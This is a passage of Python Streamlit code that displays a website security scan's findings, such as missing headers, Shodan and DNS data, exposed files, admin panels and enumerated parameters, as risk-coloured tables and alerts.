            'Risk Level': "🔴 HIGH" if len(missing_headers) > 3 else "🟡 MEDIUM" if missing_headers else "🟢 LOW",
            'Additional Info': f"Score: {len(present_headers)}/{len(security_headers)}"
        })
    
    # Protocol Security
    protocol_security = site_info.get('protocol_security', {})
    https_enabled = protocol_security.get('https_enabled', site_info.get('url', '').startswith('https://'))
    tls_version = protocol_security.get('tls_version', 'Unknown')
    
    tech_data.append({
        'Category': '🔒 HTTPS Status',
        'Technology/Component': f"{'Enabled' if https_enabled else 'Disabled'}\nTLS: {tls_version}",
        'Details & Affected URLs': f"Secure communication protocol\n🔐 Certificate: SSL/TLS encryption\n🛡️ Encryption status verified",
        'Security Notes': "Strong encryption in use" if https_enabled else "CRITICAL: No encryption - data transmitted in plaintext",
        'Risk Level': "🟢 LOW" if https_enabled else "🔴 CRITICAL",
        'Additional Info': f"TLS: {tls_version}"
    })
    
    # Display the technical intelligence data
    if tech_data:
        if PD_AVAILABLE:
            df = pd.DataFrame(tech_data)
            
            # Style based on risk level
            def highlight_risk(val):
                if 'CRITICAL' in str(val):
                    return 'background-color: #ffebee; color: #d32f2f; font-weight: bold'
                elif 'HIGH' in str(val):
                    return 'background-color: #fff3e0; color: #f57c00; font-weight: bold'
                elif 'MEDIUM' in str(val):
                    return 'background-color: #fffde7; color: #f9a825; font-weight: bold'
                elif 'LOW' in str(val):
                    return 'background-color: #e8f5e8; color: #388e3c; font-weight: bold'
                return ''
            
            try:
                styled_df = df.style.map(highlight_risk, subset=['Risk Level'])
                st.dataframe(styled_df, width=1400, height=400)
            except:
                st.dataframe(df, width=1400, height=400)
        else:
            # Fallback display
            for item in tech_data:
                with st.expander(f"{item['Category']} - {item['Risk Level']}"):
                    st.write(f"**Technology:** {item['Technology/Component']}")
                    st.write(f"**Details:** {item['Details & Affected URLs']}")
                    st.write(f"**Security Notes:** {item['Security Notes']}")
                    st.write(f"**Additional Info:** {item['Additional Info']}")
    
    else:
        st.info("No detailed technical intelligence available for this scan.")
    
    # Additional summary metrics
    if site_info:
        st.markdown("#### 🎯 Technical Summary")
        
        summary_cols = st.columns(4)
        
        with summary_cols[0]:
            server_info = site_info.get('server', 'Unknown')
            st.metric("🖥️ Server", server_info if server_info != 'Unknown' else 'Hidden')
        
        with summary_cols[1]:
            tech_count = len([k for k, v in site_info.items() if v and v != 'Unknown' and k not in ['url', 'status_code']])
            st.metric("🔧 Technologies", tech_count)
        
        with summary_cols[2]:
            https_status = "Enabled" if site_info.get('url', '').startswith('https://') else "Disabled"
            st.metric("🔒 HTTPS", https_status)
        
        with summary_cols[3]:
            headers = site_info.get('security_headers', {})
            header_score = len([k for k, v in headers.items() if v != 'Missing']) if headers else 0
            st.metric("🛡️ Security Score", f"{header_score}/10")

def _display_advanced_intelligence(site_info):
    """Display advanced reconnaissance intelligence from external sources (CLI-identical)."""
    if not site_info:
        st.markdown("### 🎯 Advanced Threat Intelligence & OSINT")
        st.info("No advanced intelligence data available for this scan.")
        return
    
    # Check if we have any advanced intelligence data
    has_advanced_data = any(key in site_info for key in [
        'shodan_intelligence', 'whois_analysis', 'technology_analysis', 
        'historical_analysis', 'dns_intelligence', 'ssl_analysis', 
        'http_analysis', 'network_analysis'
    ])
    
    if not has_advanced_data:
        st.markdown("### 🎯 Advanced Threat Intelligence & OSINT")
        st.info("Advanced intelligence gathering not available (requires API keys and additional tools).")
        return
    
    st.markdown("### 🎯 Advanced Threat Intelligence & OSINT")
    
    # Create advanced intelligence data
    intel_data = []
    
    # Shodan Intelligence
    if 'shodan_intelligence' in site_info:
        shodan_data = site_info['shodan_intelligence']
        if 'error' not in shodan_data:
            # Organization & Infrastructure
            org = shodan_data.get('organization', 'Unknown')
            country = shodan_data.get('country', 'Unknown')
            isp = shodan_data.get('isp', 'Unknown')
            intel_data.append({
                'Intelligence Source': '🔍 Shodan OSINT',
                'Category': 'Infrastructure Details',
                'Key Findings': f"Org: {org}\nCountry: {country}\nISP: {isp}",
                'Risk Assessment': 'Infrastructure fingerprinting successful'
            })
            
            # Open Ports & Services
            open_ports = shodan_data.get('open_ports', [])
            services = shodan_data.get('services', [])
            if open_ports:
                risk_level = "HIGH: Multiple attack vectors available" if len(open_ports) > 3 else "MEDIUM: Limited exposure"
                intel_data.append({
                    'Intelligence Source': '🔍 Shodan OSINT',
                    'Category': 'Network Exposure',
                    'Key Findings': f"Open Ports: {', '.join(map(str, open_ports[:5]))}\nServices: {', '.join(services[:3])}",
                    'Risk Assessment': risk_level
                })
            
            # Known Vulnerabilities
            vulnerabilities = shodan_data.get('vulnerabilities', [])
            if vulnerabilities:
                intel_data.append({
                    'Intelligence Source': '🔍 Shodan OSINT',
                    'Category': 'Known Vulnerabilities',
                    'Key Findings': f"{len(vulnerabilities)} CVE(s): {', '.join(vulnerabilities[:3])}",
                    'Risk Assessment': 'CRITICAL: Known vulnerabilities detected'
                })
    
    # WHOIS Intelligence
    if 'whois_analysis' in site_info:
        whois_data = site_info['whois_analysis']
        if 'error' not in whois_data:
            domain_name = whois_data.get('domain_name', 'Unknown')
            registrar = whois_data.get('registrar', 'Unknown')
            creation_date = whois_data.get('creation_date', 'Unknown')
            intel_data.append({
                'Intelligence Source': '📋 WHOIS Analysis',
                'Category': 'Domain Intelligence',
                'Key Findings': f"Domain: {domain_name}\nRegistrar: {registrar}\nCreated: {creation_date}",
                'Risk Assessment': 'Domain intelligence gathered successfully'
            })
    
    # Technology Analysis
    if 'technology_analysis' in site_info:
        tech_data = site_info['technology_analysis']
        if 'error' not in tech_data:
            cms = tech_data.get('cms', [])
            frameworks = tech_data.get('javascript_frameworks', [])
            analytics = tech_data.get('analytics', [])
            if cms or frameworks or analytics:
                tech_summary = []
                if cms: tech_summary.append(f"CMS: {', '.join(cms[:2])}")
                if frameworks: tech_summary.append(f"JS: {', '.join(frameworks[:2])}")
                if analytics: tech_summary.append(f"Analytics: {', '.join(analytics[:2])}")
                intel_data.append({
                    'Intelligence Source': '🔧 BuiltWith Analysis',
                    'Category': 'Technology Stack',
                    'Key Findings': '\n'.join(tech_summary),
                    'Risk Assessment': 'Technology fingerprinting successful'
                })
    
    # Historical Analysis
    if 'historical_analysis' in site_info:
        wayback_data = site_info['historical_analysis']
        if 'error' not in wayback_data:
            total_snapshots = wayback_data.get('total_snapshots', 0)
            oldest = wayback_data.get('oldest_snapshot', 'Unknown')
            if total_snapshots > 0:
                intel_data.append({
                    'Intelligence Source': '⏰ Wayback Machine',
                    'Category': 'Historical Analysis',
                    'Key Findings': f"Total Snapshots: {total_snapshots}\nOldest Archive: {oldest}",
                    'Risk Assessment': 'Historical data available for analysis'
                })
    
    # DNS Intelligence
    if 'dns_intelligence' in site_info:
        dns_data = site_info['dns_intelligence']
        if 'error' not in dns_data:
            # DNS Records Summary
            record_types = [rt for rt, records in dns_data.items() if records and rt != 'zone_transfer']
            zone_transfer = dns_data.get('zone_transfer', 'Unknown')
            risk_assessment = "CRITICAL: Zone transfer possible" if 'Possible' in zone_transfer else "DNS enumeration successful"
            intel_data.append({
                'Intelligence Source': '🌐 DNS Intelligence',
                'Category': 'DNS Configuration',
                'Key Findings': f"Record Types: {', '.join(record_types[:5])}\nZone Transfer: {zone_transfer}",
                'Risk Assessment': risk_assessment
            })
    
    # SSL/TLS Analysis
    if 'ssl_analysis' in site_info:
        ssl_data = site_info['ssl_analysis']
        if 'error' not in ssl_data and 'certificate_info' in ssl_data:
            cert_info = ssl_data['certificate_info']
            issuer = cert_info.get('issuer', 'Unknown')
            key_size = cert_info.get('key_size', 'Unknown')
            intel_data.append({
                'Intelligence Source': '🔒 SSL/TLS Analysis',
                'Category': 'Certificate Details',
                'Key Findings': f"Issuer: {issuer}\nKey Size: {key_size}",
                'Risk Assessment': 'SSL/TLS configuration analyzed'
            })
    
    # HTTP Analysis
    if 'http_analysis' in site_info:
        http_data = site_info['http_analysis']
        if 'error' not in http_data:
            http_version = http_data.get('http_version', 'Unknown')
            security_headers = http_data.get('security_headers', {})
            missing_headers = [k for k, v in security_headers.items() if v == 'missing']
            risk_assessment = "HIGH: Security headers missing" if missing_headers else "HTTP security analyzed"
            intel_data.append({
                'Intelligence Source': '🌐 HTTP Analysis',
                'Category': 'Protocol Security',
                'Key Findings': f"HTTP Version: {http_version}\nMissing Headers: {len(missing_headers)}",
                'Risk Assessment': risk_assessment
            })
    
    # Network Analysis
    if 'network_analysis' in site_info:
        network_data = site_info['network_analysis']
        if 'error' not in network_data and 'icmp_response' in network_data:
            icmp_response = network_data.get('icmp_response', False)
            ttl = network_data.get('ttl', 'Unknown')
            intel_data.append({
                'Intelligence Source': '📡 Network Analysis',
                'Category': 'Network Connectivity',
                'Key Findings': f"ICMP Response: {icmp_response}\nTTL: {ttl}",
                'Risk Assessment': 'Network analysis completed'
            })
    
    # Display the advanced intelligence data
    if intel_data:
        if PD_AVAILABLE:
            df = pd.DataFrame(intel_data)
            
            # Style based on risk assessment
            def highlight_risk(val):
                if 'CRITICAL' in str(val):
                    return 'background-color: #ffebee; color: #d32f2f; font-weight: bold'
                elif 'HIGH' in str(val):
                    return 'background-color: #fff3e0; color: #f57c00; font-weight: bold'
                elif 'MEDIUM' in str(val):
                    return 'background-color: #fffde7; color: #f9a825; font-weight: bold'
                else:
                    return 'background-color: #e8f5e8; color: #388e3c'
            
            try:
                styled_df = df.style.map(highlight_risk, subset=['Risk Assessment'])
                st.dataframe(styled_df, width=1400, height=400)
            except:
                st.dataframe(df, width=1400, height=400)
        else:
            # Fallback display
            for item in intel_data:
                with st.expander(f"{item['Intelligence Source']} - {item['Category']}"):
                    st.write(f"**Findings:** {item['Key Findings']}")
                    
                    # Color code risk assessment
                    if 'CRITICAL' in item['Risk Assessment']:
                        st.error(f"🚨 **Risk Assessment:** {item['Risk Assessment']}")
                    elif 'HIGH' in item['Risk Assessment']:
                        st.warning(f"⚠️ **Risk Assessment:** {item['Risk Assessment']}")
                    else:
                        st.info(f"ℹ️ **Risk Assessment:** {item['Risk Assessment']}")
        
        # Advanced intelligence summary
        st.markdown("#### 🎯 Advanced Intelligence Summary")
        _generate_advanced_intelligence_summary(site_info)
    
    else:
        st.info("No advanced intelligence data available for this target. Consider running scans with additional OSINT tools.")


def _generate_advanced_intelligence_summary(site_info):
    """Generate summary of advanced intelligence findings."""
    if not site_info:
        return
    
    summary_alerts = []
    
    # Shodan analysis
    if 'shodan_intelligence' in site_info:
        shodan_data = site_info['shodan_intelligence']
        if 'vulnerabilities' in shodan_data and shodan_data['vulnerabilities']:
            summary_alerts.append(("CRITICAL", f"{len(shodan_data['vulnerabilities'])} known CVEs discovered via Shodan"))
        if 'open_ports' in shodan_data and len(shodan_data['open_ports']) > 5:
            summary_alerts.append(("HIGH", f"{len(shodan_data['open_ports'])} open ports detected"))
    
    # DNS vulnerabilities
    if 'dns_intelligence' in site_info:
        dns_data = site_info['dns_intelligence']
        zone_transfer = dns_data.get('zone_transfer', '')
        if 'Possible' in zone_transfer:
            summary_alerts.append(("CRITICAL", "DNS zone transfer vulnerability detected"))
    
    # SSL/TLS issues
    if 'ssl_analysis' in site_info:
        ssl_data = site_info['ssl_analysis']
        if 'vulnerabilities' in ssl_data and ssl_data['vulnerabilities']:
            summary_alerts.append(("HIGH", f"{len(ssl_data['vulnerabilities'])} SSL vulnerabilities found"))
    
    # HTTP security
    if 'http_analysis' in site_info:
        http_data = site_info['http_analysis']
        security_headers = http_data.get('security_headers', {})
        missing_headers = [k for k, v in security_headers.items() if v == 'missing']
        if len(missing_headers) >= 4:
            summary_alerts.append(("HIGH", f"{len(missing_headers)} critical headers missing"))
    
    # Display summary alerts
    if summary_alerts:
        for severity, message in summary_alerts:
            if severity == "CRITICAL":
                st.error(f"🚨 **CRITICAL:** {message}")
            elif severity == "HIGH":
                st.warning(f"⚠️ **HIGH RISK:** {message}")
            else:
                st.info(f"ℹ️ **{severity}:** {message}")
    else:
        st.success("✅ No critical intelligence alerts identified.")

def _display_comprehensive_discovery_analysis(site_info):
    """Display comprehensive discovery analysis including webpage count, file leaks, and advanced parameters (CLI-identical)."""
    if not site_info:
        st.markdown("### 🔍 Comprehensive Discovery & Security Analysis")
        st.info("No discovery data available for this scan.")
        return
    
    # Check if we have discovery data
    has_discovery_data = any(key in site_info for key in [
        'webpage_discovery', 'file_leak_analysis', 'parameter_enumeration'
    ])
    
    if not has_discovery_data:
        st.markdown("### 🔍 Comprehensive Discovery & Security Analysis")
        st.info("Discovery analysis not available (requires deep crawling and enumeration).")
        return
    
    st.markdown("### 🔍 Comprehensive Discovery & Security Analysis")
    
    # Create comprehensive discovery data
    discovery_data = []
    
    # Webpage Discovery Analysis
    if 'webpage_discovery' in site_info:
        webpage_data = site_info['webpage_discovery']
        
        # Total Pages Discovered
        total_pages = webpage_data.get('total_pages', 0)
        risk_level = "HIGH" if total_pages > 50 else "MEDIUM" if total_pages > 20 else "LOW"
        discovery_data.append({
            'Discovery Category': '🌐 Website Discovery',
            'Metric': 'Total Pages Found',
            'Count/Details': str(total_pages),
            'Security Impact': 'Expanded attack surface - more endpoints to test',
            'Risk Level': risk_level
        })
        
        # Hidden Directories
        hidden_dirs = webpage_data.get('hidden_directories', [])
        risk_level = "HIGH" if len(hidden_dirs) > 5 else "MEDIUM" if hidden_dirs else "LOW"
        impact = f"Potential unauthorized access points: {', '.join(hidden_dirs[:3])}" if hidden_dirs else "No hidden directories found"
        discovery_data.append({
            'Discovery Category': '🌐 Website Discovery',
            'Metric': 'Hidden Directories',
            'Count/Details': str(len(hidden_dirs)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # Admin Panels
        admin_panels = webpage_data.get('admin_panels', [])
        risk_level = "CRITICAL" if admin_panels else "LOW"
        impact = f"Administrative interfaces exposed: {', '.join(admin_panels[:2])}" if admin_panels else "No admin panels detected"
        discovery_data.append({
            'Discovery Category': '🌐 Website Discovery',
            'Metric': 'Admin Panels',
            'Count/Details': str(len(admin_panels)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # API Endpoints
        api_endpoints = webpage_data.get('api_endpoints', [])
        risk_level = "HIGH" if len(api_endpoints) > 10 else "MEDIUM" if api_endpoints else "LOW"
        impact = f"API attack surface: {', '.join(api_endpoints[:3])}" if api_endpoints else "No API endpoints found"
        discovery_data.append({
            'Discovery Category': '🌐 Website Discovery',
            'Metric': 'API Endpoints',
            'Count/Details': str(len(api_endpoints)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # Robots.txt Analysis
        robots_analysis = webpage_data.get('robots_txt_analysis', {})
        if robots_analysis.get('found'):
            disallowed_paths = robots_analysis.get('disallowed_paths', [])
            risk_level = "MEDIUM" if disallowed_paths else "LOW"
            impact = f"Information disclosure via robots.txt: {', '.join(disallowed_paths[:3])}" if disallowed_paths else "Robots.txt found but no sensitive paths"
            discovery_data.append({
                'Discovery Category': '🌐 Website Discovery',
                'Metric': 'Robots.txt Leaks',
                'Count/Details': str(len(disallowed_paths)),
                'Security Impact': impact,
                'Risk Level': risk_level
            })
    
    # File Leak Analysis
    if 'file_leak_analysis' in site_info:
        leak_data = site_info['file_leak_analysis']
        
        # Total File Leaks
        total_leaks = leak_data.get('total_leaks', 0)
        if total_leaks > 10:
            risk_level = "CRITICAL"
        elif total_leaks > 5:
            risk_level = "HIGH"
        elif total_leaks > 0:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"
        
        discovery_data.append({
            'Discovery Category': '📁 File Leak Detection',
            'Metric': 'Total Sensitive Files',
            'Count/Details': str(total_leaks),
            'Security Impact': 'Sensitive information exposure risk',
            'Risk Level': risk_level
        })
        
        # Database Backups
        db_backups = leak_data.get('database_backups', [])
        risk_level = "CRITICAL" if db_backups else "LOW"
        impact = f"Critical data exposure: {', '.join(db_backups[:2])}" if db_backups else "No database backups exposed"
        discovery_data.append({
            'Discovery Category': '📁 File Leak Detection',
            'Metric': 'Database Backups',
            'Count/Details': str(len(db_backups)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # Source Code Leaks
        source_leaks = leak_data.get('source_code_leaks', [])
        risk_level = "HIGH" if source_leaks else "LOW"
        impact = f"Application source exposure: {', '.join(source_leaks[:2])}" if source_leaks else "No source code exposed"
        discovery_data.append({
            'Discovery Category': '📁 File Leak Detection',
            'Metric': 'Source Code Leaks',
            'Count/Details': str(len(source_leaks)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # Configuration Files
        config_leaks = leak_data.get('configuration_leaks', [])
        risk_level = "HIGH" if config_leaks else "LOW"
        impact = f"System configuration exposure: {', '.join(config_leaks[:2])}" if config_leaks else "No configuration files exposed"
        discovery_data.append({
            'Discovery Category': '📁 File Leak Detection',
            'Metric': 'Configuration Files',
            'Count/Details': str(len(config_leaks)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # Credential Files
        cred_files = leak_data.get('credential_files', [])
        risk_level = "CRITICAL" if cred_files else "LOW"
        impact = f"Authentication bypass risk: {', '.join(cred_files[:2])}" if cred_files else "No credential files found"
        discovery_data.append({
            'Discovery Category': '📁 File Leak Detection',
            'Metric': 'Credential Files',
            'Count/Details': str(len(cred_files)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # Log Files
        log_files = leak_data.get('log_files', [])
        risk_level = "MEDIUM" if log_files else "LOW"
        impact = f"Information leakage via logs: {', '.join(log_files[:2])}" if log_files else "No log files exposed"
        discovery_data.append({
            'Discovery Category': '📁 File Leak Detection',
            'Metric': 'Log Files',
            'Count/Details': str(len(log_files)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
    
    # Parameter Enumeration Analysis
    if 'parameter_enumeration' in site_info:
        param_data = site_info['parameter_enumeration']
        
        # Total Parameters
        total_params = param_data.get('total_parameters', 0)
        risk_level = "HIGH" if total_params > 20 else "MEDIUM" if total_params > 10 else "LOW"
        discovery_data.append({
            'Discovery Category': '🔧 Parameter Analysis',
            'Metric': 'Total Parameters',
            'Count/Details': str(total_params),
            'Security Impact': 'Expanded input validation testing surface',
            'Risk Level': risk_level
        })
        
        # GET Parameters
        get_params = param_data.get('get_parameters', [])
        risk_level = "MEDIUM" if len(get_params) > 10 else "LOW"
        impact = f"URL-based attack vectors: {', '.join(get_params[:5])}" if get_params else "No GET parameters identified"
        discovery_data.append({
            'Discovery Category': '🔧 Parameter Analysis',
            'Metric': 'GET Parameters',
            'Count/Details': str(len(get_params)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # POST Parameters
        post_params = param_data.get('post_parameters', [])
        risk_level = "MEDIUM" if len(post_params) > 10 else "LOW"
        impact = f"Form-based attack vectors: {', '.join(post_params[:5])}" if post_params else "No POST parameters found"
        discovery_data.append({
            'Discovery Category': '🔧 Parameter Analysis',
            'Metric': 'POST Parameters',
            'Count/Details': str(len(post_params)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # Injectable Parameters
        injectable_params = param_data.get('injectable_parameters', [])
        risk_level = "CRITICAL" if injectable_params else "LOW"
        impact = f"Potential injection vulnerabilities: {', '.join(injectable_params[:3])}" if injectable_params else "No injectable parameters detected"
        discovery_data.append({
            'Discovery Category': '🔧 Parameter Analysis',
            'Metric': 'Injectable Parameters',
            'Count/Details': str(len(injectable_params)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
        
        # File Upload Parameters
        upload_params = param_data.get('file_upload_parameters', [])
        risk_level = "HIGH" if upload_params else "LOW"
        impact = f"File upload attack vectors: {', '.join(upload_params[:3])}" if upload_params else "No file upload parameters"
        discovery_data.append({
            'Discovery Category': '🔧 Parameter Analysis',
            'Metric': 'File Upload Points',
            'Count/Details': str(len(upload_params)),
            'Security Impact': impact,
            'Risk Level': risk_level
        })
    
    # Display the comprehensive discovery data
    if discovery_data:
        if PD_AVAILABLE:
            df = pd.DataFrame(discovery_data)
            
            # Style based on risk level
            def highlight_risk(val):
                if 'CRITICAL' in str(val):
                    return 'background-color: #ffebee; color: #d32f2f; font-weight: bold'
                elif 'HIGH' in str(val):
                    return 'background-color: #fff3e0; color: #f57c00; font-weight: bold'
                elif 'MEDIUM' in str(val):
                    return 'background-color: #fffde7; color: #f9a825; font-weight: bold'
                elif 'LOW' in str(val):
                    return 'background-color: #e8f5e8; color: #388e3c; font-weight: bold'
                return ''
            
            try:
                styled_df = df.style.map(highlight_risk, subset=['Risk Level'])
                st.dataframe(styled_df, width=1400, height=500)
            except:
                st.dataframe(df, width=1400, height=500)
        else:
            # Fallback display
            for item in discovery_data:
                with st.expander(f"{item['Discovery Category']} - {item['Metric']} ({item['Count/Details']})"):
                    st.write(f"**Security Impact:** {item['Security Impact']}")
                    
                    # Color code risk level
                    if 'CRITICAL' in item['Risk Level']:
                        st.error(f"🚨 **Risk Level:** {item['Risk Level']}")
                    elif 'HIGH' in item['Risk Level']:
                        st.warning(f"⚠️ **Risk Level:** {item['Risk Level']}")
                    elif 'MEDIUM' in item['Risk Level']:
                        st.warning(f"🟡 **Risk Level:** {item['Risk Level']}")
                    else:
                        st.success(f"✅ **Risk Level:** {item['Risk Level']}")
        
        # Discovery summary
        st.markdown("#### 📊 Discovery Summary")
        _generate_discovery_summary(site_info)
    
    else:
        st.info("No discovery analysis data available for this target. Consider enabling deep crawling and enumeration.")


def _generate_discovery_summary(site_info):
    """Generate summary of discovery analysis findings."""
    if not site_info:
        return
    
    summary_stats = []
    critical_findings = []
    
    # Aggregate discovery statistics
    if 'webpage_discovery' in site_info:
        webpage_data = site_info['webpage_discovery']
        total_pages = webpage_data.get('total_pages', 0)
        admin_panels = webpage_data.get('admin_panels', [])
        
        summary_stats.append(f"📄 {total_pages} web pages discovered")
        if admin_panels:
            critical_findings.append(f"🚨 {len(admin_panels)} admin panels exposed")
    
    if 'file_leak_analysis' in site_info:
        leak_data = site_info['file_leak_analysis']
        total_leaks = leak_data.get('total_leaks', 0)
        db_backups = leak_data.get('database_backups', [])
        cred_files = leak_data.get('credential_files', [])
        
        summary_stats.append(f"📁 {total_leaks} sensitive files detected")
        if db_backups:
            critical_findings.append(f"🚨 {len(db_backups)} database backups exposed")
        if cred_files:
            critical_findings.append(f"🚨 {len(cred_files)} credential files found")
    
    if 'parameter_enumeration' in site_info:
        param_data = site_info['parameter_enumeration']
        total_params = param_data.get('total_parameters', 0)
        injectable_params = param_data.get('injectable_parameters', [])
        
        summary_stats.append(f"🔧 {total_params} parameters identified")
        if injectable_params:
            critical_findings.append(f"🚨 {len(injectable_params)} injectable parameters detected")
    
    # Display summary
    if summary_stats:
        stats_cols = st.columns(len(summary_stats))
        for i, stat in enumerate(summary_stats):
            with stats_cols[i]:
                st.info(stat)
    
    # Display critical findings
    if critical_findings:
        st.markdown("##### 🚨 Critical Discovery Findings")
        for finding in critical_findings:
            st.error(finding)
    else:
        st.success("✅ No critical exposure findings in discovery analysis.")

def _display_website_structure_analysis(site_info):
    """Display comprehensive website structure mapping analysis (CLI-identical)."""
    if not site_info or 'website_structure' not in site_info:
        st.markdown("### 🗺️ Website Structure Mapping Analysis")
        st.info("Website structure analysis not available (requires comprehensive crawling and enumeration).")
        return
    
    st.markdown("### 🗺️ Website Structure Mapping Analysis")
    
    structure_data = site_info['website_structure']
    
    # Create structure analysis data
    structure_analysis_data = []
    
    # Basic structure information
    discovered_urls = structure_data.get('discovered_urls', [])
    crawl_stats = structure_data.get('crawl_statistics', {})
    
    risk_level = "HIGH" if len(discovered_urls) > 100 else "MEDIUM" if len(discovered_urls) > 30 else "LOW"
    structure_analysis_data.append({
        'Category': '🗺️ Site Mapping',
        'Metric': 'Total URLs Discovered',
        'Count': str(len(discovered_urls)),
        'Details': f"Complete site structure mapped with {crawl_stats.get('crawl_depth_achieved', 0)} levels deep",
        'Risk Level': risk_level
    })
    
    unique_dirs = crawl_stats.get('unique_directories', 0)
    risk_level = "MEDIUM" if unique_dirs > 10 else "LOW"
    structure_analysis_data.append({
        'Category': '🗺️ Site Mapping',
        'Metric': 'Unique Directories',
        'Count': str(unique_dirs),
        'Details': 'Directory structure complexity and organization analysis',
        'Risk Level': risk_level
    })
    
    file_types = crawl_stats.get('file_types_discovered', 0)
    if file_types > 10:
        risk_level = "HIGH"
    elif file_types > 5:
        risk_level = "MEDIUM"
    else:
        risk_level = "LOW"
    structure_analysis_data.append({
        'Category': '🗺️ Site Mapping',
        'Metric': 'File Types Found',
        'Count': str(file_types),
        'Details': 'Technology diversity and potential attack vectors',
        'Risk Level': risk_level
    })
    
    parameters_found = crawl_stats.get('parameters_found', 0)
    if parameters_found > 20:
        risk_level = "HIGH"
    elif parameters_found > 5:
        risk_level = "MEDIUM"
    else:
        risk_level = "LOW"
    structure_analysis_data.append({
        'Category': '🗺️ Site Mapping',
        'Metric': 'Parameterized URLs',
        'Count': str(parameters_found),
        'Details': 'Dynamic content and potential injection points',
        'Risk Level': risk_level
    })
    
    # Robots.txt analysis
    robots_analysis = structure_data.get('robots_analysis', {})
    if robots_analysis.get('exists'):
        disallowed_paths = robots_analysis.get('disallowed_paths', [])
        interesting_findings = robots_analysis.get('interesting_findings', [])
        
        # Disallowed paths
        risk_level = "HIGH" if len(disallowed_paths) > 10 else "MEDIUM" if disallowed_paths else "LOW"
        details = f"Hidden areas revealed: {', '.join(disallowed_paths[:3])}" if disallowed_paths else "Standard robots.txt configuration"
        structure_analysis_data.append({
            'Category': '🤖 Robots Analysis',
            'Metric': 'Disallowed Paths',
            'Count': str(len(disallowed_paths)),
            'Details': details,
            'Risk Level': risk_level
        })
        
        # Sensitive disclosures
        risk_level = "CRITICAL" if interesting_findings else "LOW"
        details = f"Critical information leakage: {', '.join(interesting_findings[:2])}" if interesting_findings else "No sensitive path disclosures"
        structure_analysis_data.append({
            'Category': '🤖 Robots Analysis',
            'Metric': 'Sensitive Disclosures',
            'Count': str(len(interesting_findings)),
            'Details': details,
            'Risk Level': risk_level
        })
        
        # User agents
        user_agents = robots_analysis.get('user_agents', [])
        risk_level = "MEDIUM" if len(user_agents) > 3 else "LOW"
        details = f"Bot targeting rules: {', '.join(user_agents[:3])}" if user_agents else "Standard user agent handling"
        structure_analysis_data.append({
            'Category': '🤖 Robots Analysis',
            'Metric': 'Targeted User Agents',
            'Count': str(len(user_agents)),
            'Details': details,
            'Risk Level': risk_level
        })
    
    # Sitemap analysis
    sitemap_analysis = structure_data.get('sitemap_analysis', {})
    sitemaps_found = sitemap_analysis.get('sitemaps_found', [])
    if sitemaps_found:
        risk_level = "MEDIUM" if len(sitemaps_found) > 2 else "LOW"
        details = f"XML sitemaps discovered: {', '.join([s.split('/')[-1] for s in sitemaps_found[:3]])}"
        structure_analysis_data.append({
            'Category': '🗺️ Sitemap Discovery',
            'Metric': 'Sitemaps Found',
            'Count': str(len(sitemaps_found)),
            'Details': details,
            'Risk Level': risk_level
        })
        
        total_sitemap_urls = sitemap_analysis.get('total_urls', 0)
        risk_level = "HIGH" if total_sitemap_urls > 100 else "MEDIUM" if total_sitemap_urls > 20 else "LOW"
        structure_analysis_data.append({
            'Category': '🗺️ Sitemap Discovery',
            'Metric': 'Sitemap URLs',
            'Count': str(total_sitemap_urls),
            'Details': 'Additional URLs revealed through sitemaps',
            'Risk Level': risk_level
        })
    
    # Directory enumeration
    directory_enum = structure_data.get('directory_enumeration', {})
    existing_dirs = directory_enum.get('existing_directories', [])
    interesting_files = directory_enum.get('interesting_files', [])
    
    risk_level = "HIGH" if len(existing_dirs) > 10 else "MEDIUM" if existing_dirs else "LOW"
    details = f"Discoverable directories: {', '.join([d['url'].split('/')[-2] for d in existing_dirs[:3]])}" if existing_dirs else "No common directories found"
    structure_analysis_data.append({
        'Category': '📁 Directory Enum',
        'Metric': 'Accessible Directories',
        'Count': str(len(existing_dirs)),
        'Details': details,
        'Risk Level': risk_level
    })
    
    # Check for critical files
    has_critical_files = any('config' in f['url'] or 'backup' in f['url'] for f in interesting_files)
    risk_level = "CRITICAL" if has_critical_files else "HIGH" if interesting_files else "LOW"
    details = f"Critical file exposure: {', '.join([f['url'].split('/')[-1] for f in interesting_files[:3]])}" if interesting_files else "No sensitive files exposed"
    structure_analysis_data.append({
        'Category': '📁 Directory Enum',
        'Metric': 'Sensitive Files',
        'Count': str(len(interesting_files)),
        'Details': details,
        'Risk Level': risk_level
    })
    
    # Subdomain enumeration
    subdomain_enum = structure_data.get('subdomain_enumeration', {})
    discovered_subdomains = subdomain_enum.get('discovered_subdomains', [])
    interesting_subdomains = subdomain_enum.get('interesting_subdomains', [])
    
    risk_level = "HIGH" if len(discovered_subdomains) > 10 else "MEDIUM" if discovered_subdomains else "LOW"
    details = f"Additional attack surface: {', '.join(discovered_subdomains[:3])}" if discovered_subdomains else "No subdomains discovered"
    structure_analysis_data.append({
        'Category': '🌐 Subdomain Enum',
        'Metric': 'Subdomains Found',
        'Count': str(len(discovered_subdomains)),
        'Details': details,
        'Risk Level': risk_level
    })
    
    # Check for high-risk subdomains
    has_critical_subdomains = any('admin' in sub or 'test' in sub for sub in interesting_subdomains)
    risk_level = "CRITICAL" if has_critical_subdomains else "HIGH" if interesting_subdomains else "LOW"
    details = f"Critical subdomains: {', '.join(interesting_subdomains[:3])}" if interesting_subdomains else "No high-risk subdomains"
    structure_analysis_data.append({
        'Category': '🌐 Subdomain Enum',
        'Metric': 'High-Risk Subdomains',
        'Count': str(len(interesting_subdomains)),
        'Details': details,
        'Risk Level': risk_level
    })
    
    # Structure analysis patterns
    structure_analysis = structure_data.get('structure_analysis', {})
    common_patterns = structure_analysis.get('common_patterns', [])
    
    if common_patterns:
        has_admin_patterns = any('admin' in pattern.lower() for pattern in common_patterns)
        risk_level = "HIGH" if has_admin_patterns else "MEDIUM"
        details = f"Application insights: {', '.join(common_patterns[:2])}"
        structure_analysis_data.append({
            'Category': '🔍 Pattern Analysis',
